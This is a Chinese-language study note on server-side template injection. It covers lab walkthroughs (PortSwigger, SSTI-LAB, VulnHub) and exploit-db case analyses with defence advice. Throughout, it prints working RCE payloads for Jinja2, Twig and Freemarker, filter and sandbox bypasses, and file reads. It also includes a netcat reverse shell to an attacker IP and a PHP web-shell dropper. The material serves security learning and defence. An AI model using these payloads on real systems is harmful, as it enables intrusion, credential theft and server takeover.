

[TOC]

# 一、知识点

## 一、PortSwigger

------

### 实验 1: Basic SSTI (基础模板注入)

#### 目标

验证存在 SSTI 漏洞，并利用简单表达式触发模板渲染。

#### 详细步骤

1. **输入探测**：
   - 在用户输入点（如搜索框、URL参数）输入 `{{7*7}}` 或 `${7*7}`。
   - 观察返回结果是否显示 `49`，若显示则存在 SSTI。
2. **引擎判断**：
   - 若 `{{7*7}}` 返回 `49`，可能是 **Jinja2** 或 **Twig**。
   - 若 `${7*7}` 返回 `49`，可能是 **Freemarker** 或 **Velocity**。
3. **漏洞验证**：
   - 进一步测试字符串拼接：`{{"a"+"b"}}` → 若返回 `ab`，确认漏洞存在。

#### 知识点

- **语法差异**：不同引擎的模板语法（如 `{{}}` vs `${}`）。
- **漏洞确认**：通过数学运算或字符串操作验证模板渲染。

------

### 实验 2: SSTI in a Different Context (不同上下文的注入)

#### 目标

在非直接输出位置（如邮件内容、日志）触发 SSTI。

#### 详细步骤

1. **功能分析**：
   - 寻找可能将用户输入嵌入模板的功能（如用户注册后的欢迎邮件）。
2. **输入注入**：
   - 在可能被模板引擎渲染的参数中注入 `{{7*7}}`（如邮箱字段）。
3. **间接触发**：
   - 触发功能（如发送邮件），检查输出结果是否渲染为 `49`。

#### 知识点

- **输入点隐蔽性**：SSTI 可能出现在非显式输出位置（如日志、邮件模板）。
- **间接利用**：需要结合功能触发漏洞（如生成报告、发送通知）。

------

### 实验 3: SSTI with Code Execution (代码执行)

#### 目标

通过 SSTI 实现远程命令执行（RCE）。

#### 详细步骤（以 Jinja2 为例）

1. **确认引擎类型**：

   - 输入 `{{7*'7'}}`，若返回 `7777777` 则为 Jinja2；若返回 `49` 则为 Twig。

2. **构造 RCE Payload**：

   - 访问内置对象链（Python）：

     ```
     {{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
     ```

   - 若过滤了 `.`，改用 `[]` 或 `|attr()`：

     ```
     {{ self|attr("__init__")|attr("__globals__")|attr("__builtins__")|attr("__import__")("os").popen("id").read() }}
     ```

3. **执行命令**：

   - 注入后查看响应内容，获取命令执行结果（如当前用户权限）。

#### 知识点

- **对象链调用**：通过 `__globals__`、`__builtins__` 访问系统模块（如 `os`）。
- **绕过符号过滤**：使用 `attr()` 过滤器或 `[]` 替代 `.`。

------

### 实验 4: SSTI in a Sandboxed Environment (沙箱逃逸)

#### 目标

在受限的沙箱环境中绕过限制，执行代码。

#### 详细步骤

1. **探测沙箱限制**：

   - 尝试调用 `os` 模块，若被拦截，寻找替代对象（如 `request`、`config`）。

2. **利用框架内置对象**：

   - Flask 的 `config` 对象泄露敏感信息：

     ```
     {{ config.items() }}  # 获取数据库密码等配置
     ```

   - 通过 `request` 对象逃逸：

     ```
     {{ request.application.__self__._get_data_for_json.__globals__ }}
     ```

3. **构造逃逸链**：

   - 从框架对象中提取 `os` 模块或执行命令的函数。

#### 知识点

- **沙箱绕过**：利用框架内置对象（如 Flask 的 `request`、`config`）突破限制。
- **上下文敏感**：沙箱可能禁用部分函数，但保留框架上下文对象。

------

### 实验 5: SSTI with Unknown Engine (未知引擎的盲注)

#### 目标

在盲注场景下识别模板引擎并利用漏洞。

#### 详细步骤

1. **引擎指纹识别**：

   - 注入多种语法测试响应差异：
     - `{{7*'7'}}` → Jinja2（`7777777`） vs Twig（`49`）。
     - `<%= 7*7 %>` → ERB（Ruby）返回 `49`。

2. **盲注技巧**：

   - 使用条件语句判断引擎类型：

     ```
     {{ 'a' if (7*7==49) else 'b' }}  # 返回 'a' 则为支持条件判断的引擎
     ```

   - 时间盲注：通过延迟响应判断命令执行：

     ```
     {{ self.__init__.__globals__.__builtins__.sleep(5) }}
     ```

#### 知识点

- **盲注探测**：通过条件语句或时间延迟推断引擎类型。
- **多引擎兼容**：需熟悉不同引擎的语法和响应特征。

------

### 实验 6: Filter Bypass (绕过过滤)

#### 目标

绕过黑名单过滤（如禁用 `__`、`.`、`os` 等关键字）。

#### 详细步骤

1. **字符替换**：

   - 使用 `[]` 替代 `.`：

     ```
     {{ self["__init__"]["__globals__"]["__builtins__"]["__import__"]("os") }}
     ```

2. **编码绕过**：

   - 十六进制编码关键字：

     ```
     {{ self|attr("\x5f\x5finit\x5f\x5f") }}  # "__init__"
     ```

3. **字符串拼接**：

   - 使用 `~` 或 `+` 拼接字符串：

     ```
     {{ (("__ini"+"t__")|attr) }}  # 拼接 "__init__"
     ```

#### 知识点

- **黑名单绕过**：灵活使用编码、拼接和替代语法。
- **过滤器利用**：`attr()`、`join()` 等方法构造 Payload。

------

### 总结

| 实验编号 | 核心漏洞         | 利用技巧                     | 绕过方法                | 防御措施             |
| :------- | :--------------- | :--------------------------- | :---------------------- | :------------------- |
| 1        | 基础模板注入验证 | 数学运算探测引擎类型         | 无                      | 过滤 `{{}}` 或 `${}` |
| 2        | 隐蔽输入点注入   | 触发间接功能（邮件、日志）   | 无                      | 限制模板渲染上下文   |
| 3        | 代码执行（RCE）  | 对象链调用访问 `os` 模块     | 使用 `attr()` 替代 `.`  | 禁用危险函数         |
| 4        | 沙箱逃逸         | 利用框架内置对象（`config`） | 上下文链式调用          | 启用严格沙箱模式     |
| 5        | 盲注与引擎识别   | 条件语句/时间延迟探测引擎    | 多语法测试              | 统一模板引擎配置     |
| 6        | 黑名单过滤绕过   | 编码/拼接关键字              | 十六进制编码、`[]` 替代 | 白名单校验输入内容   |

## 二、SSTI-LAB

------

### 关卡1：基础Jinja2 SSTI

- **解题思路**
  1. 输入`{{7*7}}`确认存在SSTI（输出`49`）。
  2. 通过类继承链获取`object`子类：
     `{{''.__class__.__mro__[1].__subclasses__()}}`
  3. 在子类列表中查找可执行命令的类（如`subprocess.Popen`），构造Payload执行命令。
- **关键知识点**
  - Jinja2模板语法（`{{}}`）。
  - Python类继承链（`__class__`、`__mro__`、`__subclasses__`）。
  - 利用危险子类（如`subprocess.Popen`）实现RCE。

------

### 关卡2：过滤关键词（class、mro等）

- **解题思路**
  1. 使用`attr`过滤器绕过关键词过滤：
     `{{''|attr('__class__')}}`
  2. 拼接字符串绕过：
     `{{''['__cla'+'ss__']}}`
  3. 通过`request.args`传递参数：
     `{{''[request.args.a]}}`（URL参数：`?a=__class__`）。
- **关键知识点**
  - Jinja2过滤器（`|attr`）。
  - 字符串拼接和动态参数传递。
  - 绕过黑名单过滤的策略。

------

### 关卡3：禁用危险模块（如os、subprocess）

- **解题思路**
  1. 通过`__globals__`访问模块：
     `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`
  2. 使用`__builtins__`导入模块：
     `{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__.__builtins__['__import__']('os').system('ls')}}`（`X`为对应索引）。
- **关键知识点**
  - `__globals__`访问全局变量。
  - `__builtins__`内置函数的利用。
  - 索引查找危险子类的技巧。

------

### 关卡4：沙盒环境限制

- **解题思路**
  1. 利用`self`对象访问内置函数：
     `{{self.__init__.__globals__.__builtins__.eval("__import__('os').system('ls')")}}`
  2. 通过`namespace`对象绕过：
     `{{namespace.__init__.__globals__.os.system('ls')}}`（需环境支持）。
- **关键知识点**
  - `self`对象的内部属性。
  - 沙盒环境中内置变量的利用。
  - `eval`和`__import__`的链式调用。

------

### 关卡5：综合过滤与高级绕过

- **解题思路**
  1. Base64编码命令并解码执行：
     `{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('echo "bHMgLWxhCg==" | base64 -d | sh').read()}}`
  2. 使用`format`过滤器拼接字符串：
     `{{ "%.3f"|format(1337)|replace("133", "ls") }}`（需结合其他漏洞）。
- **关键知识点**
  - 编码/解码绕过字符串检测。
  - 利用模板过滤器（如`replace`、`format`）构造命令。
  - 多步骤Payload组合攻击。

------

### 总结

| 关卡 | 解题思路                            | 关键知识点                                   |
| :--- | :---------------------------------- | :------------------------------------------- |
| 1    | 基础Payload执行命令                 | Jinja2语法、类继承链、`subprocess.Popen`利用 |
| 2    | 过滤绕过（`attr`、字符串拼接）      | 过滤器使用、动态参数传递、黑名单绕过         |
| 3    | `__globals__`和`__builtins__`利用   | 全局变量访问、内置函数调用、索引查找         |
| 4    | 沙盒环境下的`self`和`namespace`利用 | 内置对象属性、沙盒逃逸、`eval`函数           |
| 5    | 编码与过滤器组合攻击                | Base64编码、过滤器链、多步骤攻击             |

## 三、VulnHub SSTI VM

### 实验 1: 基础注入 (Jinja2)

#### 目标

通过 SSTI 读取 `/etc/passwd` 文件。

#### 解题步骤

1. **探测漏洞**：

   - 在输入框注入 `{{7*7}}`，返回 `49`，确认存在 SSTI（Jinja2）。

2. **构造 Payload**：

   - 利用文件读取函数：

     ```
{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}  
     ```

   - 或使用 `config` 对象泄露信息（Flask 环境）：
   
     ```
  {{ config.items() }}  # 查看数据库密码等配置  
     ```

3. **结果验证**：

   - 响应中显示 `/etc/passwd` 文件内容或配置信息。

#### 知识点

- **Jinja2 语法**：使用 `{{}}` 包裹模板表达式。
- **内置对象链**：通过 `__globals__` 和 `__builtins__` 访问系统函数。

------

### 实验 2: 引擎识别与盲注 (Twig)

#### 目标

盲注识别模板引擎类型并读取 `/flag.txt`。

#### 解题步骤

1. **输入探测**：

   - 注入 `{{7*'7'}}`，若返回 `49`，则为 **Twig**（Jinja2 返回 `7777777`）。

2. **构造 Twig Payload**：

   - Twig 的 RCE 利用链：

     ```
   {{ _self.env.registerUndefinedFilterCallback("exec") }}  
     {{ _self.env.getFilter("cat /flag.txt") }}  
   ```
   
3. **结果验证**：

   - 响应中显示 `flag.txt` 的内容。

#### 知识点

- **Twig 特性**：使用 `_self` 上下文和过滤器回调执行命令。
- **盲注技巧**：通过数学运算或字符串操作判断引擎类型。

------

### 实验 3: 代码执行 (Freemarker)

#### 目标

通过 Freemarker 实现远程代码执行。

#### 解题步骤

1. **探测语法**：

   - 输入 `${7*7}`，返回 `49`，确认 Freemarker 引擎。

2. **构造 RCE Payload**：

   - 利用 `new` 关键字实例化 `Runtime` 对象：

     ```
   <#assign ex = "freemarker.template.utility.Execute"?new()>  
     ${ ex("cat /flag.txt") }  
   ```
   
3. **结果验证**：

   - 响应中返回命令执行结果（如 flag 内容）。

#### 知识点

- **Freemarker 语法**：使用 `${}` 和 `<#assign>` 标签。
- **危险类调用**：通过 `Execute` 类执行系统命令。

------

### 实验 4: 沙箱绕过 (Python 沙箱)

#### 目标

在禁用 `os` 模块的沙箱中执行命令。

#### 解题步骤

1. **探测限制**：

   - 尝试调用 `os.system`，返回错误提示 `os is undefined`。

2. **寻找替代对象**：

   - 利用 `subprocess` 模块绕过：

     ```
{{ self.__init__.__globals__.__builtins__.__import__('subprocess').check_output('ls', shell=True) }}  
     ```

   - 或通过 `url_for`（Flask 上下文）泄露路径：
   
     ```
  {{ url_for.__globals__ }}  # 获取全局对象链  
     ```

3. **结果验证**：

   - 成功列出目录或执行命令。

#### 知识点

- **沙箱绕过**：利用未禁用的模块（如 `subprocess`）或框架上下文对象。
- **全局对象探测**：枚举 `__globals__` 寻找可用函数。

------

### 实验 5: 过滤绕过 (黑名单过滤)

#### 目标

绕过对 `__`、`.`、`os` 等关键字的过滤，执行命令。

#### 解题步骤

1. **编码绕过**：

   - 使用十六进制编码关键字（如 `__init__` → `\x5f\x5finit\x5f\x5f`）：

     ```
  {{ self|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f") }}  
     ```

2. **字符串拼接**：

   - 拼接关键字绕过黑名单：

     ```
  {{ self|attr("__ini"+"t__")|attr("__glo"+"bals__") }}  
     ```

3. **结果验证**：

   - 成功访问 `__globals__` 并执行命令。

#### 知识点

- **过滤绕过技巧**：编码、拼接、替代符号（如 `[]` 代替 `.`）。
- **灵活构造 Payload**：利用模板引擎的字符串操作特性。

------

### 总结

| 实验编号 | 模板引擎   | 漏洞类型 | 关键 Payload                                                 | 绕过技巧                |      |
| :------- | :--------- | :------- | :----------------------------------------------------------- | :---------------------- | ---- |
| 1        | Jinja2     | 文件读取 | `{{ self.__globals__.__builtins__.open('/etc/passwd').read() }}` | 对象链调用              |      |
| 2        | Twig       | RCE      | `{{ _self.env.getFilter("cat /flag.txt") }}`                 | Twig 回调函数利用       |      |
| 3        | Freemarker | RCE      | `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }` | 实例化危险类            |      |
| 4        | Python     | 沙箱逃逸 | `{{ url_for.__globals__.os.system('id') }}`                  | 框架上下文利用          |      |
| 5        | 通用       | 过滤绕过 | `{{ self                                                     | attr("\x5f\x5finit\x5f\x5f") }}` | 十六进制编码/字符串拼接 |      |

# 二、案例

## 案例概览

| 序号 | 系统名称             | CVE编号        | 影响版本 | 风险等级 | 利用场景           | 关键技术点                |
| :--- | :------------------- | :------------- | :------- | :------- | :----------------- | :------------------------ |
| 1    | Akaunting            | -              | 3.1.8    | 高危     | 商品/税收/交易表单 | Jinja2类继承链            |
| 2    | Gibbon LMS           | CVE-2024-24724 | v26.0.00 | 高危     | 系统配置模块       | Twig过滤器`filter()`      |
| 3    | FoF Pretty Mail      | -              | 1.1.2    | 高危     | 邮件模板编辑       | PHP原生模板`system()`调用 |
| 4    | Winter CMS           | -              | 1.2.2    | 高危     | CMS模板编辑        | Twig全局变量泄露          |
| 5    | Pyro CMS             | CVE-2023-29689 | 3.9      | 高危     | 角色描述编辑       | Twig过滤器链式调用        |
| 6    | CmsMadeSimple        | -              | 2.2.17   | 高危     | 内容编辑模块       | Smarty Cookie变量泄露     |
| 7    | MotoCMS              | -              | 3.0.27   | 高危     | URL参数注入        | 动态模板解析              |
| 8    | Camaleon CMS         | CVE-2023-30145 | <2.7.0   | 高危     | 文件上传接口       | ERB代码执行               |
| 9    | Grav CMS             | CVE-2021-29440 | 1.7.10   | 高危     | 页面内容编辑       | Twig系统函数调用          |
| 10   | Atlassian Confluence | CVE-2019-3396  | <6.14.3  | 严重     | Widget宏参数       | Velocity路径遍历          |

## 一、Akaunting 3.1.8 - 服务端模板注入（SSTI）

[Akaunting 3.1.8 - Server-Side Template Injection (SSTI) - PHP webapps Exploit](https://www.exploit-db.com/exploits/52030)

### **漏洞概述**

**漏洞名称**：Akaunting 3.1.8 - 服务端模板注入（SSTI）
**风险等级**：高危
**影响版本**：Akaunting 3.1.8
**漏洞类型**：服务端模板注入（SSTI）
**利用后果**：攻击者可通过注入恶意模板代码实现远程命令执行（RCE）、数据泄露等。

------

### **漏洞复现步骤**

#### **漏洞点1：新建商品（Items）**

1. **路径**：`Items > New Item`
   URL：`https://127.0.0.1/Akaunting/1/common/items`
2. **注入步骤**：
   - 在`Name`字段输入SSTI Payload：`{{7*7}}`
   - 填写`Sale Price`和`Purchase Price`为任意数字。
   - 点击保存后，页面显示`49`，确认存在SSTI漏洞。

------

#### **漏洞点2：税收设置（Taxes）**

1. **路径**：`Settings > Taxes > New Tax`
   URL：`https://127.0.0.1/Akaunting/1/settings/taxes/1/edit`
2. **注入步骤**：
   - 在`Name`字段输入Payload：`{{7*7}}`
   - 保存后页面显示`49`。
   - **扩展验证**：
     - `{{'a'.toUpperCase()}}` → 显示`A`
     - `{{'a'.concat('b')}}` → 显示`ab`

------

#### **漏洞点3：新增收入（Transactions）**

1. **路径**：`Banking > Transactions > New Income`
   URL：`https://127.0.0.1/Akaunting/1/banking/transactions/create?type=income`
2. **注入步骤**：
   - 在`Description`字段输入Payload：`{{7*7}}`
   - 保存后页面显示`49`。
   - **扩展验证**（同上）：字符串操作成功执行。

------

#### **漏洞点4：供应商编辑（Vendors）**

1. **路径**：`Purchases > Vendors > Edit Vendor`
   URL：`https://127.0.0.1/Akaunting/1/purchases/vendors/1/edit`
2. **注入步骤**：
   - 在`Name`字段输入Payload：`{{7*7}}`
   - 保存后页面显示`49`。
   - **扩展验证**（同上）：字符串操作成功执行。

------

### **漏洞原理分析**

1. **模板引擎**：Akaunting使用Jinja2模板引擎渲染页面，但未对用户输入进行过滤。
2. **输入注入**：攻击者在可编辑字段注入`{{}}`语法，服务端直接解析并执行其中的代码。
3. **利用后果**：
   - 通过`{{7*7}}`验证漏洞存在。
   - 使用字符串方法（如`concat`、`toUpperCase`）验证模板引擎的动态执行能力。
   - **进一步攻击**：可通过构造恶意Payload执行系统命令（如`{{''.__class__.__mro__[1].__subclasses__()[X]}}`）。

------

### **防御建议**

1. **输入过滤**：对用户输入的特殊字符（如`{{`、`}}`）进行转义或禁止使用。
2. **沙盒环境**：限制模板引擎的访问权限，禁用危险函数（如`os`、`subprocess`）。
3. **更新补丁**：升级到最新版本，修复已知漏洞。

------

### **关键知识点总结**

| 漏洞点     | 注入字段    | 验证Payload    | 扩展验证方法                | 风险等级 |
| :--------- | :---------- | :------------- | :-------------------------- | :------- |
| 新建商品   | Name        | `{{7*7}}` → 49 | 字符串操作（`toUpperCase`） | 高危     |
| 税收设置   | Name        | `{{7*7}}` → 49 | 字符串拼接（`concat`）      | 高危     |
| 新增收入   | Description | `{{7*7}}` → 49 | 同税收设置                  | 高危     |
| 供应商编辑 | Name        | `{{7*7}}` → 49 | 同税收设置                  | 高危     |

------

**总结**：Akaunting 3.1.8在多个功能模块中未对用户输入进行过滤，导致攻击者可通过SSTI漏洞执行任意代码。建议立即修复并加强输入验证机制。

## 二、Gibbon LMS v26.0.00 - 服务端模板注入（SSTI）

[Gibbon LMS v26.0.00 - SSTI vulnerability - PHP webapps Exploit](https://www.exploit-db.com/exploits/51962)

### **漏洞概述**

**漏洞名称**：Gibbon LMS v26.0.00 - 服务端模板注入（SSTI）
**CVE编号**：CVE-2024-24724
**风险等级**：高危
**影响版本**：Gibbon LMS v26.0.00
**漏洞类型**：服务端模板注入（SSTI）
**利用后果**：攻击者可通过注入模板代码实现远程命令执行（RCE），完全控制服务器。

------

### **漏洞复现步骤**

1. **登录系统**

   - 使用管理员账号密码登录，获取会话Cookie。
   - **关键函数**：`login()`通过构造`multipart/form-data`请求绕过登录验证。

2. **注入SSTI Payload**

   - 向`/modules/School Admin/messengerSettingsProcess.php`发送恶意数据包。

   - **注入点**：`signatureTemplate`参数。

   - **Payload示例**：

     ```
   {{['rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 攻击者IP 端口 >/tmp/f']|filter('system')}}
     ```

   - **关键函数**：`rce()`构造反向Shell命令并触发模板执行。
   
3. **触发漏洞**

   - 访问`/index.php?q=/modules/School%20Admin/messengerSettings.php`激活Payload。
   - **关键函数**：`trigger()`通过GET请求触发漏洞执行。

------

### **漏洞原理分析**

1. **模板引擎**：Gibbon LMS使用Twig模板引擎，但未对用户输入的`signatureTemplate`参数进行过滤。
2. **注入逻辑**：
   - 攻击者通过`filter('system')`调用Twig过滤器，将数组元素作为系统命令执行。
   - Payload利用管道符`|`将命令传递给`system`函数，实现RCE。
3. **反向Shell构造**：
   - 通过`mkfifo`创建命名管道，结合`nc`（Netcat）建立反向Shell连接。

------

### **防御建议**

1. **输入过滤**：对用户输入的`{{}}`语法和危险符号（如`|`、`'`）进行转义。
2. **禁用危险函数**：在Twig配置中禁用`system`、`exec`等危险函数。
3. **权限控制**：限制后台管理功能的访问权限，避免低权限用户利用漏洞。
4. **升级补丁**：升级至官方修复版本。

------

### **关键知识点总结**

| 漏洞阶段     | 技术细节                                    | 关键知识点                                             |
| :----------- | :------------------------------------------ | :----------------------------------------------------- |
| **登录绕过** | 构造`multipart/form-data`请求绕过登录验证   | 表单边界（`boundary`）构造、会话Cookie提取             |
| **SSTI注入** | 利用`signatureTemplate`参数注入Twig模板代码 | Twig模板语法（`{{}}`）、过滤器（`filter`）调用系统函数 |
| **命令执行** | `filter('system')`执行数组中的命令          | 系统命令拼接、反向Shell构造（`mkfifo`+`nc`）           |
| **漏洞触发** | 通过访问特定URL激活Payload                  | GET请求触发模板渲染漏洞                                |

------

### **攻击链分析**

1. **信息收集**：确认目标版本为v26.0.00，获取管理员凭证。
2. **漏洞利用**：
   - 登录 → 注入Payload → 触发RCE → 获取反向Shell。
3. **权限维持**：通过反向Shell植入后门或横向移动。

------

### **检测与修复验证**

1. **漏洞检测**：
   - 输入`{{7*7}}`观察是否返回`49`。
   - 使用`{{['id']|filter('system')}}`验证命令执行。
2. **修复验证**：
   - 检查`signatureTemplate`参数是否过滤特殊字符。
   - 确认Twig配置中禁用危险过滤器。

------

**总结**：该漏洞通过Twig模板注入实现RCE，攻击链清晰且危害极大。建议立即修复并加强输入验证机制。

## 三、FoF Pretty Mail 1.1.2 - 服务端模板注入（SSTI）

[FoF Pretty Mail 1.1.2 - Server Side Template Injection (SSTI) - PHP webapps Exploit](https://www.exploit-db.com/exploits/51948)

### **漏洞概述**

**漏洞名称**：FoF Pretty Mail 1.1.2 - 服务端模板注入（SSTI）
**风险等级**：高危
**影响版本**：FoF Pretty Mail 1.1.2（Flarum扩展）
**漏洞类型**：服务端模板注入（SSTI）
**利用后果**：攻击者可通过注入模板代码实现远程命令执行（RCE），完全控制服务器。

------

### **漏洞复现步骤**

1. **登录系统**

   - 使用管理员账号登录Flarum论坛后台。

2. **定位注入点**

   - 进入`FoF Pretty Mail`扩展设置 → 编辑电子邮件默认模板。

3. **注入Payload**

   ```
   {{ 7*7 }}  
   {{ system('id') }}  
   {{ system('echo "Take The Rose"') }}  
   ```
   
4. **触发漏洞**

   - 执行触发邮件发送的操作（如用户注册）。
   - 查看邮件内容，验证命令执行结果（如`49`、用户ID输出、自定义字符串）。

------

### **漏洞原理分析**

1. **模板引擎**：扩展使用服务端模板引擎（如Twig或PHP原生模板）渲染邮件内容，但未对用户输入过滤。
2. **注入逻辑**：
   - `{{ system('id') }}`直接调用PHP的`system()`函数执行系统命令。
   - 模板引擎将用户输入解析为可执行代码，导致RCE。
3. **权限依赖**：需管理员权限，但危害极大（可接管服务器）。

------

### **关键知识点总结**

| 漏洞阶段        | 技术细节                                             | 关键知识点                                            |
| :-------------- | :--------------------------------------------------- | :---------------------------------------------------- |
| **注入点定位**  | 邮件模板编辑功能（后台管理界面）                     | 管理员权限依赖、功能模块路径（`FoF Pretty Mail`设置） |
| **Payload构造** | 直接调用`system()`函数执行命令                       | PHP函数暴露、模板引擎语法（`{{}}`）                   |
| **命令执行**    | 通过邮件触发模板渲染，执行任意系统命令               | 邮件发送机制与模板渲染的关联、无过滤直接解析          |
| **漏洞验证**    | 观察邮件内容中的命令输出（如`id`结果或`echo`字符串） | 输出反馈机制、攻击链闭环验证                          |

------

### **防御建议**

1. **输入过滤**：对邮件模板内容中的`{{}}`语法和危险函数（如`system`）进行转义或禁用。
2. **权限控制**：限制后台管理权限，避免低权限用户接触敏感功能。
3. **沙盒机制**：在模板引擎中启用沙盒模式，禁止执行系统级函数。
4. **升级补丁**：升级至官方修复版本，或禁用存在漏洞的扩展。

------

### **与其他SSTI漏洞对比**

| 漏洞名称                 | 利用场景             | 权限要求   | 注入方式             | 关键函数/语法                    |      |
| :----------------------- | :------------------- | :--------- | :------------------- | :------------------------------- | ---- |
| **FoF Pretty Mail SSTI** | 邮件模板编辑（后台） | 管理员权限 | 直接调用`system()`   | `{{ system() }}`                 |      |
| **Akaunting SSTI**       | 商品/税收/交易表单   | 管理员权限 | Jinja2类继承链       | `{{''.__class__}}`               |      |
| **Gibbon LMS SSTI**      | 系统配置模块（后台） | 管理员权限 | Twig过滤器`filter()` | `{{[...]           | filter()}}` |      |

------

### **攻击链扩展**

- **权限提升**：通过RCE植入Web Shell或后门程序，实现持久化控制。
- **横向渗透**：利用服务器权限访问内网其他服务。
- **数据窃取**：读取数据库凭证、用户敏感信息等。

------

**总结**：此漏洞通过邮件模板注入直接调用系统函数，攻击路径短且破坏性强。需结合权限隔

## 四、 Winter CMS 1.2.2 SSTI漏洞分析

[Winter CMS 1.2.3 - Server-Side Template Injection (SSTI) (Authenticated) - PHP webapps Exploit](https://www.exploit-db.com/exploits/51893)

### **漏洞概述**

**漏洞名称**：Winter CMS 1.2.2 - 服务端模板注入（SSTI）
**风险等级**：高危
**影响版本**：Winter CMS 1.2.2
**漏洞类型**：服务端模板注入（SSTI）
**利用后果**：攻击者可泄露敏感配置信息（如数据库凭证），甚至通过进一步利用实现远程代码执行（RCE）。

------

### **漏洞复现步骤**

1. **登录系统**
   - 使用管理员账号登录后台。
2. **定位注入点**
   - 进入`CMS > Pages` → 编辑插件组件模板。
   - 路径：`/backend/cms#secondarytab-cmslangeditormarkup`
3. **注入Payload**
   - 输入SSTI Payload：`{{7*7}}` 或 `{{ dump() }}`
4. **触发漏洞**
   - 保存后访问预览页面（如`/demo/plugins`），观察结果：
     - `{{7*7}}` → 显示`49`
     - `{{ dump() }}` → 泄露数据库配置（含密码、用户名等）。

------

### **漏洞原理分析**

1. **模板引擎**：Winter CMS使用Twig模板引擎，但未对用户输入的模板内容进行过滤。
2. **注入逻辑**：
   - `{{7*7}}`验证模板引擎的动态执行能力。
   - `{{ dump() }}`调用Twig内置函数，输出全局变量（包括数据库配置）。
3. **权限依赖**：需管理员权限，但危害极大（可泄露敏感数据或扩展为RCE）。

------

### **关键知识点总结**

| 漏洞阶段        | 技术细节                                     | 关键知识点                                       |
| :-------------- | :------------------------------------------- | :----------------------------------------------- |
| **注入点定位**  | CMS页面编辑功能（插件组件模板）              | 后台管理权限依赖、模板编辑路径（`CMS > Pages`）  |
| **Payload构造** | 直接调用Twig函数（如`dump()`）或算术运算     | Twig模板语法（`{{}}`）、内置函数利用（`dump()`） |
| **信息泄露**    | 通过`dump()`泄露数据库配置（密码、连接信息） | 全局变量暴露、敏感数据泄露路径                   |
| **漏洞验证**    | 预览页面显示计算结果或配置信息               | 模板渲染与数据输出的关联性                       |

------

### **防御建议**

1. **输入过滤**：禁止用户输入`{{}}`语法或转义危险字符（如`{`、`}`）。
2. **权限隔离**：限制管理员权限，避免非必要用户访问模板编辑功能。
3. **禁用危险函数**：在Twig配置中禁用`dump()`等敏感函数。
4. **升级补丁**：升级至官方修复版本，或关闭未使用的模板编辑功能。

------

### **与其他SSTI漏洞对比**

| 漏洞名称                 | 利用场景             | 权限要求   | 注入方式             | 关键函数/语法                    |      |
| :----------------------- | :------------------- | :--------- | :------------------- | :------------------------------- | ---- |
| **Winter CMS SSTI**      | CMS模板编辑（后台）  | 管理员权限 | Twig内置函数`dump()` | `{{ dump() }}`                   |      |
| **Akaunting SSTI**       | 商品/税收/交易表单   | 管理员权限 | Jinja2类继承链       | `{{''.__class__}}`               |      |
| **FoF Pretty Mail SSTI** | 邮件模板编辑（后台） | 管理员权限 | 直接调用`system()`   | `{{ system() }}`                 |      |
| **Gibbon LMS SSTI**      | 系统配置模块（后台） | 管理员权限 | Twig过滤器`filter()` | `{{[...]           | filter()}}` |      |

------

### **攻击链扩展**

- **敏感数据利用**：通过泄露的数据库密码直接连接数据库，篡改或窃取数据。
- **RCE升级**：结合Twig的`system()`或`exec()`函数（若可用）实现命令执行。
- **持久化后门**：在模板中植入Web Shell代码（如`{{ file_put_contents('shell.php', '<?php eval($_POST[cmd]); ?>') }}`）。

------

### **检测与修复验证**

1. **漏洞检测**：
   - 输入`{{7*7}}`观察是否返回`49`。
   - 使用`{{ dump(config) }}`验证配置泄露。
2. **修复验证**：
   - 检查模板编辑功能是否禁用`{{}}`语法。
   - 确认`dump()`函数在Twig配置中被禁用。

------

**总结**：Winter CMS 1.2.2的SSTI漏洞通过模板编辑功能直接暴露敏感数据，攻击门槛低但危害性高。需结合输入过滤和权限控制进行深度防御。

## 五、Pyro CMS 3.9 SSTI漏洞分析

[Pyro CMS 3.9 - Server-Side Template Injection (SSTI) (Authenticated) - Python webapps Exploit](https://www.exploit-db.com/exploits/51669)

### **漏洞概述**

**漏洞名称**：Pyro CMS 3.9 - 服务端模板注入（SSTI）
**CVE编号**：CVE-2023-29689
**风险等级**：高危
**影响版本**：Pyro CMS 3.9
**漏洞类型**：服务端模板注入（SSTI）
**利用后果**：攻击者可通过注入模板代码实现远程命令执行（RCE），完全控制服务器。

------

### **漏洞复现步骤**

1. **登录系统**

   - 使用管理员账号（如`admin@adm.com`）登录后台。

2. **定位注入点**

   - 进入`用户管理 > 角色编辑`（路径：`/admin/users/roles/edit/1`）。

3. **注入Payload**

   - 在`Description`字段输入Twig Payload：

     ```
   {{["id"]|map("system")|join}}  
     ```

   - 替换`id`为任意系统命令（如`whoami`、`cat /etc/passwd`）。
   
4. **触发漏洞**

   - 保存角色修改后，访问角色列表页面（`/admin/users/roles`），观察`Description`字段显示命令执行结果。

------

### **漏洞原理分析**

1. **模板引擎**：Pyro CMS使用Twig模板引擎，但未对角色描述字段的输入进行过滤。
2. **注入逻辑**：
   - `map("system")`将数组元素（如`["id"]`）逐个传递给`system`函数执行。
   - `join`过滤器将命令输出结果拼接为字符串并渲染到页面。
3. **权限依赖**：需管理员权限访问角色编辑功能，但漏洞危害性极高（直接RCE）。

------

### **关键知识点总结**

| 漏洞阶段        | 技术细节                                    | 关键知识点                                              |
| :-------------- | :------------------------------------------ | :------------------------------------------------------ |
| **注入点定位**  | 角色编辑功能（`Description`字段）           | 后台管理权限依赖、功能路径（`/admin/users/roles/edit`） |
| **Payload构造** | 利用Twig的`map`和`system`过滤器执行命令     | Twig过滤器链式调用（`map("system")`）、数组传递命令     |
| **命令执行**    | 通过模板渲染将命令结果输出到页面            | 模板渲染与命令执行的关联性、无过滤直接解析              |
| **漏洞验证**    | 角色列表页面的`Description`字段显示命令输出 | 输出反馈机制、攻击链闭环验证                            |

------

### **防御建议**

1. **输入过滤**：对用户输入中的`{{}}`语法和危险过滤器（如`map`、`system`）进行转义或禁用。
2. **权限控制**：限制后台管理权限，避免非必要用户接触敏感功能。
3. **沙盒机制**：在Twig配置中启用沙盒模式，禁止执行系统级函数。
4. **升级补丁**：升级至官方修复版本，或禁用角色描述字段的动态模板解析。

------

